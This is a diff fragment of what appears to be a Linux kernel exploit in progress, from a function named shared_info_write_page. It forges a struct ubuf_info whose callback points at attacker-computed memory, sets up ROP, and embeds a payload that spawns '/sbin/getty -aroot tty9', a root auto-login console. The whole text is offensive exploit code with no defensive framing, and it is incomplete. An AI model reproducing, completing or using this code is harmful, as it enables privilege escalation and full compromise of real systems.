@@ -220,8 +220,10 @@ static inline void shared_info_write_page(char *base)
 {
 	/* Gil, write your ROP code magic here */
 
-	*(u64*)base = gilkup_vars.page_offset + (PFN << 12) + sizeof(u64); //TODO: need your PFN...
-	base += sizeof(u64);
+	struct ubuf_info *uarg = (struct ubuf_info*)base;
+	uarg->callback = gilkup_vars.page_offset + (PFN << 12) + sizeof(*uarg);
+	refcount_set(&uarg->refcnt, 1);
+	base += sizeof(*uarg);
 
 	// "/sbin/getty -aroot tty9"
 	// 2f 73 62 69 6e 2f 67 65 74 74 79 20 2d 61 72 6f 6f 74 20 74 74 79 39 00
